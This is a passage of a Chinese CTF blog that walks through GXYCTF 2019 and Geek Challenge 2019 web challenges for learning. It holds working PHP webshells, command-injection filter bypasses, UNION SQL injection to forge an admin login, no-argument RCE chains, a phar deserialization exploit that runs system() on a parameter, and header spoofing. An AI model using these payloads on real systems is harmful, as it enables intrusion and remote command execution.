**web20**\n\n**知识点:****mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。**\n\n 根据提示‘mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加/db/db.mdb 下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag ’ 或用notepad++打开搜索flag即可得到答案\n\n**注:记得三件套，源代码，使用dirsearch扫描目录，社工，善于采集信息，了解基础的信息泄露的原理，同时也要注意保护隐私信息**\n","tags":["信息搜集"],"categories":["ctfshow"]},{"title":"GXYCTF","url":"/2024/11/12/GXYCTF(已做完)/","content":"\n# 0x01前言\n\n坚持每天都做做赛题，加油!\n\n# 0x02赛题\n\n## [GXYCTF2019]Ping Ping Ping\n\n![image-20241112203942641](./../image/achieve/202411/GXYCTF/image-20241112203942641.png)\n\n根据题目可以知道这个可能是rce命令执行题目，先ping一下本地看看\n\n`/?ip=127.0.0.1`\n\n![image-20241112204059123](./../image/achieve/202411/GXYCTF/image-20241112204059123.png)\n\nping出来了，那就试一下管道符拼接命令\n\n`/?ip=127.0.0.1||ls`\n\n介绍一下||管道符\n\n| \\|\\| | A\\|\\|B | A命令语句执行失败，然后才执行B命令语句，否则执行A命令语句 |\n| ---- | ------ | --------------------------------------------------------- |\n\n没有发现回显，一开始以为这不是linux环境我我还换了dir查看目录，发现dir也不行，我就换了一下管道符，用分号拼接ls\n\n`/?ip=127.0.0.1;ls`\n\n![image-20241112204630999](./../image/achieve/202411/GXYCTF/image-20241112204630999.png)\n\n发现flag.php文件，尝试cat一下\n\n`/?ip=127.0.0.1;cat flag.php`\n\n![image-20241112204723780](./../image/achieve/202411/GXYCTF/image-20241112204723780.png)\n\n出现回显，原来是过滤了空格\n\n那就用绕过空格过滤的方法\n\n### 绕过空格过滤\n\n- < <> 重定向符 \n- %20(space) \n- %09(tab)\n- $IFS$1 \n- **${IFS}（最好用这个）** \n- $IFS\n- %0a  换行符 \n- {cat,flag.txt} 在大括号中逗号可起分隔作用\n\n用${IFS}试试看\n\n`/?ip=127.0.0.1;cat${IFS}flag.php`\n\n\n\n![image-20241112205123386](./../image/achieve/202411/GXYCTF/image-20241112205123386.png)\n\n发现{}符号也被过滤了\n\n用$IFS$1试试\n\n/?ip=127.0.0.1;cat$IFS$1flag.php\n\n![image-20241112205416201](./../image/achieve/202411/GXYCTF/image-20241112205416201.png)\n\n好吧flag也被过滤了，那就用通配符进行绕过\n\n### 通配符绕过\n\n配符是由shell处理的, 它只会出现在 命令的“参数”里。当shell在“参数”中遇到了通配符时，shell会将其当作路径或文件名去在磁盘上搜寻可能的匹配：若符合要求的匹配存在，则进行代换(路径扩展)；否则就将该通配符作为一个普通字符传递给“命令”，然后再由命令进行处理。总之，通配符 实际上就是一种shell实现的路径扩展功能。在 通配符被处理后, shell会先完成该命令的重组，然后再继续处理重组后的命令，直至执行该命令。\n\n| *       | 匹配任何字符串／文本，包括空字符串；*代表任意字符（0个或多个） |\n| ------- | ------------------------------------------------------------ |\n| ?       | 匹配任何一个字符（不在括号内时）?代表任意1个字符             |\n| [abcd ] | 匹配指定字符范围内的任意单个字符                             |\n| [a-z]   | 表示范围a到z，表示范围的意思                                 |\n\n对于linux cat和ca''t ca\\t ca\"\"t效果是相同的 这样同样可以绕过字符的限制\n\n\n\n![image-20241112205514862](./../image/achieve/202411/GXYCTF/image-20241112205514862.png)\n\n真可恶，*和?都被过滤了\n\n换成别的绕过方法试一下\n\n### **其他绕过flag方法**\n\n1.反斜杠\\绕过flag\n\n2.''单引号绕过flag\n\n发现还是不能绕过，我们倒回去看一下index里面看看有没有源代码吧\n\n![image-20241112205918716](./../image/achieve/202411/GXYCTF/image-20241112205918716.png)\n\n这里对flag进行了任意字符的匹配，所以无论中间用什么字符进行隔开绕过都会当成flag进行处理，这时候我们可以试一下赋值拼接绕过\n\n/?ip=127.0.0.1;b=ag;c=fl;cat$IFS$1$c$b.php\n\n发现并没有过滤的回显，看一下源码里面有没有flag，终于找到了\n\n注意:有些绕过了flag但在源码中并没有找到flag，我也不知道是什么原因\n\n## [GXYCTF2019]BabyUpload\n\n一看就是文件上传漏洞\n\n![image-20241112211519114](./../image/achieve/202411/GXYCTF/image-20241112211519114.png)\n\n先传一句话木马看看\n\n```php\n<? eval($_POST['code']);?>\n```\n\n![image-20241112211615761](./../image/achieve/202411/GXYCTF/image-20241112211615761.png)\n\n发现有文件后缀的验证，**由此我们得知，文件后缀不可以有ph，那么php3,php5,phtml等后缀自然无法使用了。**先测试一下看看是前端验证还是后端\n\n先把文件后缀改成jpg格式，然后上传并抓包修改后缀为php，再放包\n\n![image-20241112211943256](./../image/achieve/202411/GXYCTF/image-20241112211943256.png)\n\n发现还是对后缀名进行了警告，说明应该不是前端的js验证后缀名了，考虑是不是文件头检测\n\n那就做一个图片马\n\n先选一张小一点的图片，然后将一句话木马和图片合成为一张图片马\n\ncmd命令\n\ncopy /b 原始图片.jpg + 恶意代码文件.php 合成图片.jpg\n\n![image-20241112212708540](./../image/achieve/202411/GXYCTF/image-20241112212708540.png)\n\n不放心的话我们可以把2.jpg拖到010里面看一下是否有一句话木马\n\n![image-20241112213954966](./../image/achieve/202411/GXYCTF/image-20241112213954966.png)\n\n这里上传图片马记得修改后缀名，图片截的有问题\n\n也有警告,试一下00截断能不能绕过php\n\n![image-20241112214958964](./../image/achieve/202411/GXYCTF/image-20241112214958964.png)\n\n好吧，骗不过他\n\n试一下**.htaccess**文件上传\n\n先传一个**.htaccess**文件看看能不能成功\n\n新建一个txt文件并写入\n\nAddType application/x-httpd-php .jpg\n\n意思是可以将上传的jpg文件当作php文件去解析\n\n然后将后缀名改成.htaccess\n\n上传看看能不能通过\n\n发现还是显示上传类型太露骨,应该是也对htaccess文件进行了过滤，我们试着把content_type头改一下\n\n修改如下\n\n![image-20241114231931492](./../image/achieve/202411/GXYCTF/image-20241114231931492.png)\n\n发现上传成功，我们试着传一个jpg格式的一句话木马\n\n![image-20241114232718954](./../image/achieve/202411/GXYCTF/image-20241114232718954.png)\n\n结果发现还是传不了，我直接换了一个木马，换成phtml的木马\n\n```phtml\n<script language=\"php\">eval($_REQUEST[cmd])</script>\n```\n\n![image-20241114232900177](./../image/achieve/202411/GXYCTF/image-20241114232900177.png)\n\n发现这个上传成功了，那我们访问一下木马\n\n发现没有呈现图片，说明我们的phtml文件被解析执行了，那就直接用蚁剑连接找flag就行了\n\n## [GXYCTF2019]BabySQli\n\n打开题目是登录界面，那就先进行一系列的测试\n\n用1和1'测试后发信有回显报错，判断存在注入点且为单引号闭合\n\n![image-20241114234332630](./../image/achieve/202411/GXYCTF/image-20241114234332630.png)\n\n接下来是判断注入类型了，看看是整数型还是字符型\n\n但是当我用or 1=1判断的时候出现页面\n\n![image-20241114234519210](./../image/achieve/202411/GXYCTF/image-20241114234519210.png)\n\n猜测应该是or被黑名单限制了\n\n后续用双写绕过，order by判断字段数也是一样，基本上确定有黑名单验证了\n\n直接试一下union有没有被过滤\n\n1' union select 1,2#\n\n![image-20241114235140695](./../image/achieve/202411/GXYCTF/image-20241114235140695.png)\n\n1' union select 1,2,3#\n\n![image-20241114235157364](./../image/achieve/202411/GXYCTF/image-20241114235157364.png)\n\n没报错，说明字段数应该是3个\n\n虽然union select没被过滤，但database被过滤了，真让人头大\n\n抓包做看看有没有线索\n\n![image-20241114235429495](./../image/achieve/202411/GXYCTF/image-20241114235429495.png)\n\n居然还真有，在response包中看到一段注释掉的编码，我们解码一下\n\n我一开始用的base64解码发现是乱码，就试了一下其他base解码，通过测试发现是套加密（二次加密）,需要先base32解码再base64解码\n\n解码后的结果是:\n\n```\nselect * from user where username = '$name'\n```\n\n可以看到注入点是在name参数，那就对name参数进行sql注入\n\n先假设用户名是admin进行测试:\n\nadmin'#\n\n发现出现wrong pass\n\n证明是有admin这个用户的，但密码并不正确\n\n不过这一关用到了sql的一个特性\n\n### sql特性:**在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据**\n\n首先第一步判断回显点，利用穷举法，看页面回显判断\n\n’union select1,2, ‘admin’#\n\n页面回显 wrong user! 但我们知道 用户名是正确的，所以只能是位置错了。\n\n由此判断出 admin的位置\n\n'union select 1,'admin',3#\n\n通过题目的源代码可以知道，这里的密码是进行了md5加密过的，在最后面的代码中中提到只有密码进行md5编码才会得到flag\n\n```php+HTML\n<!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5-->\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> \n<title>Do you know who am I?</title>\n<?php\nrequire \"config.php\";\nrequire \"flag.php\";\n\n// 去除转义\nif (get_magic_quotes_gpc()) {\n\tfunction stripslashes_deep($value)\n\t{\n\t\t$value = is_array($value) ?\n\t\tarray_map('stripslashes_deep', $value) :\n\t\tstripslashes($value);\n\t\treturn $value;\n\t}\n\n\t$_POST = array_map('stripslashes_deep', $_POST);\n\t$_GET = array_map('stripslashes_deep', $_GET);\n\t$_COOKIE = array_map('stripslashes_deep', $_COOKIE);\n\t$_REQUEST = array_map('stripslashes_deep', $_REQUEST);\n}\n\nmysqli_query($con,'SET NAMES UTF8');\n$name = $_POST['name'];\n$password = $_POST['pw'];\n$t_pw = md5($password);\n$sql = \"select * from user where username = '\".$name.\"'\";\n// echo $sql;\n$result = mysqli_query($con, $sql);\n\n\nif(preg_match(\"/\\(|\\)|\\=|or/\", $name)){\n\tdie(\"do not hack me!\");\n}\nelse{\n\tif (!$result) {\n\t\tprintf(\"Error: %s\\n\", mysqli_error($con));\n\t\texit();\n\t}\n\telse{\n\t\t// echo '<pre>';\n\t\t$arr = mysqli_fetch_row($result);\n\t\t// print_r($arr);\n\t\tif($arr[1] == \"admin\"){\n\t\t\tif(md5($password) == $arr[2]){\n\t\t\t\techo $flag;\n\t\t\t}\n\t\t\telse{\n\t\t\t\tdie(\"wrong pass!\");\n\t\t\t}\n\t\t}\n\t\telse{\n\t\t\tdie(\"wrong user!\");\n\t\t}\n\t}\n}\n\n?>\n\n```\n\n那我们就构造虚拟的数据\n\nname=1' union select 1,'admin','c4ca4238a0b923820dcc509a6f75849b'#&pw=1\n\n这里c4ca4238a0b923820dcc509a6f75849b是1的md5加密值\n\n这里利用的知识点不多，但是如果不看源代码的话估计到死都做不出来这道题\n\n## [GXYCTF2019]禁止套娃\n\n![image-20241115002008584](./../image/achieve/202411/GXYCTF/image-20241115002008584.png)\n\n是一点线索都不给啊\n\n用御剑扫了一下目录，但也没什么收获\n\n参考了各位师傅的wp后发现是.git泄露\n\n用githack把泄露的代码摘下来\n\n```\npython githack.py url/.git/\n```\n\n摘下来的代码会放在githack目录下\n\n![image-20241115222634445](./../image/achieve/202411/GXYCTF/image-20241115222634445.png)\n\n进入b4d0310f-0918-425b-8f37-c1069fc45ecf.node5.buuoj.cn_81文件可以看到有index.php，说明源代码被我们摘下来了\n\nindex.php\n\n```php\n<?php\ninclude \"flag.php\";\necho \"flag在哪里呢？<br>\";\nif(isset($_GET['exp'])){\n    if (!preg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', $_GET['exp'])) {\n        if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])) {\n            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {\n                // echo $_GET['exp'];\n                @eval($_GET['exp']);\n            }\n            else{\n                die(\"还差一点哦！\");\n            }\n        }\n        else{\n            die(\"再好好想想！\");\n        }\n    }\n    else{\n        die(\"还想读flag，臭弟弟！\");\n    }\n}\n// highlight_file(__FILE__);\n?>\n\n```\n\npreg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', $_GET['exp'])--这里过滤了大部分的伪协议，比如 `data://`、`filter://`、`php://` 和 `phar://`\n\nif (';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp']))--这里的匹配替换一个字符+符号+加上对括号的递归调用，例如以下\n\n![img](./../image/achieve/202411/GXYCTF/20210325204736-46bca358-8d68-1.png)\n\n判断匹配替换后的 结果是不是为;，说明这里我们只能让传入的exp是仅包含函数调用的形式，替换结果才会为;，比如func();，而不应该有其他字符\n\nif (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) --这里进一步检查输入中的字符是否包含关键字\n\n### 解题思路:函数嵌套实现无参数rce\n\n明确了是需要实现无参数rce的话，那我们得通过第三层验证考虑哪些函数可以用了，\n\npreg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])\n\n#### payload1:读取文件\n\n```php\nexp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));\n```\n\nhighlight_file() 函数对文件进行语法高亮显示，本函数是show_source() 的别名\nnext() 输出数组中的当前元素和下一个元素的值。\narray_reverse() 函数以相反的元素顺序返回数组。(主要是能返回值)\nscandir() 函数返回指定目录中的文件和目录的数组。\npos() 输出数组中的当前元素的值。\nlocaleconv() 函数返回一个包含本地数字及货币格式信息的数组，该数组的第一个元素就是\".\"。\n\n![image-20241116104609373](./../image/achieve/202411/GXYCTF/image-20241116104609373.png)\n\n#### payload2:数组操作\n\n```\n?exp=var_dump(scandir(pos(localeconv())));\narray(5) { [0]=> string(1) \".\" [1]=> string(2) \"..\" [2]=> string(4) \".git\" [3]=> string(8) \"flag.php\" [4]=> string(9) \"index.php\" }\n\n?exp=var_dump(array_reverse(scandir(pos(localeconv()))));\narray(5) { [0]=> string(9) \"index.php\" [1]=> string(8) \"flag.php\" [2]=> string(4) \".git\" [3]=> string(2) \"..\" [4]=> string(1) \".\" }\n\n?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));\n```\n\n`pos() / current()` 默认返回数组第一个元素\n`end()` ： 将内部指针指向数组中的最后一个元素，并输出\n`next()` ：将内部指针指向数组中的下一个元素，并输出\n`prev()` ：将内部指针指向数组中的上一个元素，并输出\n`reset()` ： 将内部指针指向数组中的第一个元素，并输出\n`each()` ： 返回当前元素的键名和键值，并将内部指针向前移动\n\n`pos()` 输出数组中的当前元素的值。\n\n`localeconv()` 函数返回一个包含本地数字及货币格式信息的数组，该数组的第一个元素就是”.”。\n\n`array_reverse()`函数将数组逆向返回\n\n#### payload3：session_id\n\n通过获取session_id设置为flag.php来获取flag\n\n```php\n?exp=highlight_file(session_id(session_start()));\n```\n\n```\nRequest:\n\nGET /?exp=highlight_file(session_id(session_start())); HTTP/1.1\nHost: 5e48725e-b21b-41a7-96d1-398a11a05f3d.node5.buuoj.cn:81\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\ncookie:PHPSESSID=flag.php\nConnection: close\n```\n\n\n\n## [GXYCTF2019]StrongestMind\n\n![image-20241116173131330](./../image/achieve/202411/GXYCTF/image-20241116173131330.png)\n\n算出来填进去看看回显\n\n发现每次的计算都不一样，那bp抓包提交应该是不行的了，只能写个脚本\n\n### 加减法计算脚本\n\n```python\nimport re\nimport requests\nfrom time import sleep\n\n\ndef count():\n    s = requests.session()\n    url = 'http://c39b6aaa-4d51-4b1d-b777-32741c72ccc8.node3.buuoj.cn/'\n    match = re.compile(r\"[0-9]+ [+|-] [0-9]+\")\n    r = s.get(url)\n    for i in range(1001):\n        sleep(0.1)\n        str = match.findall(r.text)[0]\n        # print(eval(str))\n        data = {\"answer\" : eval(str)}\n        r = s.post(url, data=data)\n        r.encoding = \"utf-8\"\n        print('{} : {}'.format(i,eval(str)))\n        # print(r.text)\n    print(r.text)\n\n\n\nif __name__ == '__main__':\n    count()\n\n```\n\n如果觉得慢的话可以写多线程的或者设置延时时间，这样会快得多，但也容易出现429\n\n![image-20241121205803605](./../image/achieve/202411/GXYCTF/image-20241121205803605.png)\n\n## [GXYCTF2019]BabysqliV3.0\n\n![image-20241121210117323](./../image/achieve/202411/GXYCTF/image-20241121210117323.png)\n\n弱口令登录一下，发现就登录成功了\n\n![image-20241121210544355](./../image/achieve/202411/GXYCTF/image-20241121210544355.png)\n\n一开始以为是一道文件上传题目，但是打半天没打通，后来才发现是一道phar反序列化\n\n先看url，发现有file=的格式，猜测是文件包含，直接在后面加上.php看看\n\n![image-20241123215639970](./../image/achieve/202411/GXYCTF/image-20241123215639970.png)\n\n无语了。。。我们用伪协议读试试\n\n![image-20241123220409844](./../image/achieve/202411/GXYCTF/image-20241123220409844.png)\n\n```php\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> \n\n<form action=\"\" method=\"post\" enctype=\"multipart/form-data\">\n\t上传文件\n\t<input type=\"file\" name=\"file\" />\n\t<input type=\"submit\" name=\"submit\" value=\"上传\" />\n</form>\n\n<?php\nerror_reporting(0);\nclass Uploader{\n\tpublic $Filename;\n\tpublic $cmd;\n\tpublic $token;\n\t\n\n\tfunction __construct(){\n\t\t$sandbox = getcwd().\"/uploads/\".md5($_SESSION['user']).\"/\";\n\t\t$ext = \".txt\";\n\t\t@mkdir($sandbox, 0777, true);\n\t\tif(isset($_GET['name']) and !preg_match(\"/data:\\/\\/ | filter:\\/\\/ | php:\\/\\/ | \\./i\", $_GET['name'])){\n\t\t\t$this->Filename = $_GET['name'];\n\t\t}\n\t\telse{\n\t\t\t$this->Filename = $sandbox.$_SESSION['user'].$ext;\n\t\t}\n\n\t\t$this->cmd = \"echo '<br><br>Master, I want to study rizhan!<br><br>';\";\n\t\t$this->token = $_SESSION['user'];\n\t}\n\n\tfunction upload($file){\n\t\tglobal $sandbox;\n\t\tglobal $ext;\n\n\t\tif(preg_match(\"[^a-z0-9]\", $this->Filename)){\n\t\t\t$this->cmd = \"die('illegal filename!');\";\n\t\t}\n\t\telse{\n\t\t\tif($file['size'] > 1024){\n\t\t\t\t$this->cmd = \"die('you are too big (′▽`〃)');\";\n\t\t\t}\n\t\t\telse{\n\t\t\t\t$this->cmd = \"move_uploaded_file('\".$file['tmp_name'].\"', '\" . $this->Filename . \"');\";\n\t\t\t}\n\t\t}\n\t}\n\n\tfunction __toString(){\n\t\tglobal $sandbox;\n\t\tglobal $ext;\n\t\t// return $sandbox.$this->Filename.$ext;\n\t\treturn $this->Filename;\n\t}\n\n\tfunction __destruct(){\n\t\tif($this->token != $_SESSION['user']){\n\t\t\t$this->cmd = \"die('check token falied!');\";\n\t\t}\n\t\teval($this->cmd);\n\t}\n}\n\nif(isset($_FILES['file'])) {\n\t$uploader = new Uploader();\n\t$uploader->upload($_FILES[\"file\"]);\n\tif(@file_get_contents($uploader)){\n\t\techo \"下面是你上传的文件：<br>\".$uploader.\"<br>\";\n\t\techo file_get_contents($uploader);\n\t}\n}\n\n?>\n\n```\n\n同样也可以得到home.php\n\n![image-20241123220022096](./../image/achieve/202411/GXYCTF/image-20241123220022096.png)\n\n```php\n<?php\nsession_start();\necho \"<meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\" /> <title>Home</title>\";\nerror_reporting(0);\nif(isset($_SESSION['user'])){\n\tif(isset($_GET['file'])){\n\t\tif(preg_match(\"/.?f.?l.?a.?g.?/i\", $_GET['file'])){\n\t\t\tdie(\"hacker!\");\n\t\t}\n\t\telse{\n\t\t\tif(preg_match(\"/home$/i\", $_GET['file']) or preg_match(\"/upload$/i\", $_GET['file'])){\n\t\t\t\t$file = $_GET['file'].\".php\";\n\t\t\t}\n\t\t\telse{\n\t\t\t\t$file = $_GET['file'].\".fxxkyou!\";\n\t\t\t}\n\t\t\techo \"当前引用的是 \".$file;\n\t\t\trequire $file;\n\t\t}\n\t\t\n\t}\n\telse{\n\t\tdie(\"no permission!\");\n\t}\n}\n?>\n```\n\nhome.php代码看上去是对文件上传的一个过滤，但是在upload.php中是关于类和方法的，感觉是反序列化问题，没有反序列化函数但是又涉及到文件上传，结合两个来看就是一道phar反序列化\n\n我们先来分析一下upload.php中反序列化的内容\n\n```php\n<?php\nerror_reporting(0);\nclass Uploader{\n\tpublic $Filename;\n\tpublic $cmd;\n\tpublic $token;\n\tfunction __construct(){\n\t\t$sandbox = getcwd().\"/uploads/\".md5($_SESSION['user']).\"/\";\n\t\t$ext = \".txt\";\n\t\t@mkdir($sandbox, 0777, true);\n\t\tif(isset($_GET['name']) and !preg_match(\"/data:\\/\\/ | filter:\\/\\/ | php:\\/\\/ | \\./i\", $_GET['name'])){\n\t\t\t$this->Filename = $_GET['name'];\n\t\t}\n\t\telse{\n\t\t\t$this->Filename = $sandbox.$_SESSION['user'].$ext;\n\t\t}\n\n\t\t$this->cmd = \"echo '<br><br>Master, I want to study rizhan!<br><br>';\";\n\t\t$this->token = $_SESSION['user'];\n\t}\n\tfunction upload($file){\n\t\tglobal $sandbox;\n\t\tglobal $ext;\n\t\tif(preg_match(\"[^a-z0-9]\", $this->Filename)){\n\t\t\t$this->cmd = \"die('illegal filename!');\";\n\t\t}\n\t\telse{\n\t\t\tif($file['size'] > 1024){\n\t\t\t\t$this->cmd = \"die('you are too big (′▽`〃)');\";\n\t\t\t}\n\t\t\telse{\n\t\t\t\t$this->cmd = \"move_uploaded_file('\".$file['tmp_name'].\"', '\" . $this->Filename . \"');\";\n\t\t\t}\n\t\t}\n\t}\n\tfunction __toString(){\n\t\tglobal $sandbox;\n\t\tglobal $ext;\n\t\t// return $sandbox.$this->Filename.$ext;\n\t\treturn $this->Filename;\n\t}\n\tfunction __destruct(){\n\t\tif($this->token != $_SESSION['user']){\n\t\t\t$this->cmd = \"die('check token falied!');\";\n\t\t}\n\t\teval($this->cmd);\n\t}\n}\nif(isset($_FILES['file'])) {\n\t$uploader = new Uploader();\n\t$uploader->upload($_FILES[\"file\"]);\n\tif(@file_get_contents($uploader)){\n\t\techo \"下面是你上传的文件：<br>\".$uploader.\"<br>\";\n\t\techo file_get_contents($uploader);\n\t}\n}\n?>\n```\n\n这里可以看到在__destruct中有eval函数，所以我们应该围绕这个eval中的cmd进行解题，既然要让cmd可控那就必须通过上面对token的验证，所以我们应该让token等于会话中的user，而如果我们不自己传递name的值，则Filename的值中会包含SESSION[′user′]中，而如果用户不自己传递name的值，则Filename的值中会包含_SESSION['user']，所以我们不传递name值，随便上传一个文件去获取到session中的user值\n\n![image-20241124110139796](./../image/achieve/202411/GXYCTF/image-20241124110139796.png)\n\ntxt前面的就是我们的session中user的值了，那我们就直接构造exp\n\nexp\n\n```php\n<?php\n\n \nclass Uploader{\n\t\tpublic $Filename = 'aaa';\n\t\t//public $cmd ='echo phpinfo();';//可先用此测试\n\t\tpublic $cmd ='echo system($_GET[\"hack\"]);';//传递一个可控hack参数\n\t\tpublic $token ='GXYc5eda5d2bd6b7220ae12068a537ac4e5';//先上串一个合法文件得到session['user']\n\t\t\n}\n \n@unlink(\"demo.phar\");\n$phar = new Phar(\"demo.phar\");//后缀名必须为phar\n$phar->startBuffering();\n$phar->setStub(\"GIF8a<?php __HALT_COMPILER();?>\");\n$o    = new Uploader();\n$phar -> setMetadata($o);//将自定义的meta-data存入manifest\n$phar -> addFromString(\"text.txt\",\"test\");//添加要压缩的文件\n//签名自动计算\n$phar -> stopBuffering();\n \n?>\n```\n\n然后在本地运行生成phar文件并上传\n\n![image-20241124111430609](./../image/achieve/202411/GXYCTF/image-20241124111430609.png)\n\n拿到路径后用bp抓包进行传参\n\n![image-20241124111640722](./../image/achieve/202411/GXYCTF/image-20241124111640722.png)\n\n对hack进行传入命令执行就可以了\n\n![image-20241124111734874](./../image/achieve/202411/GXYCTF/image-20241124111734874.png)\n","tags":["GXYCTF"],"categories":["赛题wp"]},{"title":"极客大挑战2019wp--web(已做完)","url":"/2024/11/11/极客大挑战2019wp--web(已做完)/","content":"\n# 0x01前言\n\n听说极客大挑战的题目挺好的，刚好ctfshow做累了，就去一个个复现去做题积累经验\n\n# 0x02赛题\n\n## [极客大挑战 2019]Http\n\n打开题目\n\n![image-20241111144846929](./../image/achieve/202411/极客大挑战2019/image-20241111144846929.png)\n\n搜罗一圈之后没看到什么，Ctrl+u看一下源代码，然后在里面发现了一个Secret.php，访问看看\n\n![image-20241111145020815](./../image/achieve/202411/极客大挑战2019/image-20241111145020815-1731307826332-2.png)\n\n意思是我们不是来自https://Sycsecret.buuoj.cn的访问，一看就知道是请求头信息伪造了\n\n### 知识点:请求头大全\n\nHeader\t\t\t解释\t\t\t\t\t\t\t示例\n\nAccept\t\t\t指定客户端可以接收的内容类型\tAccept:application/json, text/plain, **/**\n\nAccept-Charset\t浏览器能够接受的字符编码集。\tAccept-Charset: iso-8859-5\n\nAccept-Encoding\t指定浏览器能够支持的web服务器返回内容压缩编码类型。\tAccept-Encoding: gzip, deflate, br\n\nAccept-Language\t浏览器可接受的语言\t\t\tAccept-Language: zh-CN,zh;q=0.9\n\nAccept-Ranges\t能够请求网页实体的一个或者多个子范围字段\tAccept-Ranges: bytes\n\nAuthorization\t\tHTTP受权的受权证书\t\t\tAuthorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==\n\nCache-Control\t\t指定请求和响应遵循的缓存机制\tCache-Control: max-age=0\n\nConnection\t\t表示是否须要持久链接。（HTTP 1.1默认进行持久链接）\tConnection: keep-alive\n\nCookie\t\t\tHTTP请求发送时，会把保存在该请求域名下的全部cookie值一块儿发送给web服务器。\tCookie: OUTFOX_SEARCH_USER_ID=280392207@10.110.96.158\n\nContent-Length\t请求的内容长度\tContent-Length: 348\n\nContent-Type\t\t请求的与实体对应的MIME信息\t\tContent-Type: application/json;charset=UTF-8\n\nDate\t\t\t请求发送的日期和时间\t\t\t\tDate: Tue, 15 Nov 2010 08:12:31 GMT\n\nExpect\t\t\t请求的特定的服务器行为\t\t\tExpect: 100-continue\n\n**From\t\t\t发出请求的用户的Email\t\t\t\tFrom: user@email.com**\n\nHost\t\t\t\t指定请求的服务器的域名和端口号\tHost: www.baidu.com\n\nIf-Match\t\t\t只有请求内容与实体相匹配才有效\t\tIf-Match: “737060cd8c284d8af7ad3082f209582d”\n\nIf-Modified-Since\t若是请求的部分在指定时间以后被修改则请求成功，未被修改则返回304代码\tIf-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT\n\nIf-None-Match\t\t若是内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变\tIf-None-Match: “737060cd8c284d8af7ad3082f209582d”\n\nIf-Range\t\t\t若是实体未改变，服务器发送客户端丢失的部分，不然发送整个实体。参数也为Etag\tIf-Range: “737060cd8c284d8af7ad3082f209582d”\n\nIf-Unmodified-Since\t只在实体在指定时间以后未被修改才请求成功\tIf-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT\n\nMax-Forwards\t\t\t限制信息经过代理和网关传送的时间\t\tMax-Forwards: 10\n\nPragma\t\t\t\t用来包含实现特定的指令\t\t\t\tPragma: no-cache\n\nProxy-Authorization\t\t链接到代理的受权证书\t\t\t\t\t\tProxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==\n\nRange\t\t\t\t只请求实体的一部分，指定范围\t\t\t\t\t\tRange: bytes=500-999\n\n**Referer\t\t\t\t先前网页的地址，当前请求网页紧随其后,即来路\t\t\tReferer: www.baidu.com**\n\nTE\t\t\t\t\t客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息\tTE: trailers,deflate;q=0.5\n\nUpgrade\t\t\t\t向服务器指定某种传输协议以便服务器进行转换（若是支持）\tUpgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11\n\n**User-Agent\t\t\tUser-Agent的内容包含发出请求的用户信息\t\t\t\tUser-Agent: Mozilla/5.0 (Linux; X11)**\n\n**Via\t\t\t\t\t通知中间网关或代理服务器地址，通讯协议\t\t\t\t\t\tVia: 1.0 fred, 1.1 nowhere.com (Apache/1.1)**\n\nWarning\t\t\t\t关于消息实体的警告信息\t\t\t\t\t\t\t\tWarn: 199 Miscellaneous warning\n\n**X-Forwarded-For\t\t用来说明从哪里来的，一般用来内网伪装\t\t\tX-Forwarded-For: 127.0.0.1**\n\n那就用bp抓包看看\n\n![image-20241111145609789](./../image/achieve/202411/极客大挑战2019/image-20241111145609789-1731308171053-4.png)\n\n#### 1.Referer伪造请求来源网页\n\n发现并没有referer头，那就只能自己伪造一个了\n\nReferer: https://Sycsecret.buuoj.cn\n\n(记得放中间哈，放最后可能会send不出来)\n\n![image-20241111150156390](./../image/achieve/202411/极客大挑战2019/image-20241111150156390-1731308518660-6.png)\n\n#### 2.User-Agent伪造请求用户\n\nUser-Agent: Syclover\n\n![image-20241111150217001](./../image/achieve/202411/极客大挑战2019/image-20241111150217001-1731308538274-8.png)\n\n#### 3.X-Forwarded-For内网伪装\n\nX-Forwarded-For: 127.0.0.1\n\n![image-20241111150322118](./../image/achieve/202411/极客大挑战2019/image-20241111150322118-1731308603740-10-1731308605708-12-1731308607620-14-1731308609277-16.png)\n\n成功拿到flag！\n\n## [极客大挑战 2019]PHP\n\n![image-20241111150708988](./../image/achieve/202411/极客大挑战2019/image-20241111150708988-1731308832350-1.png)\n\n他说他有备份网址的习惯，盲猜是信息泄露\n\n先看看源代码\n\n![image-20241111150853118](./../image/achieve/202411/极客大挑战2019/image-20241111150853118-1731308934392-3.png)\n\n### **网站备份文件漏洞:**\n\n- 网站备份压缩文件 漏洞成因:在网站的升级和维护过程中，通常需要对网站中的文件进行修改。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站 web 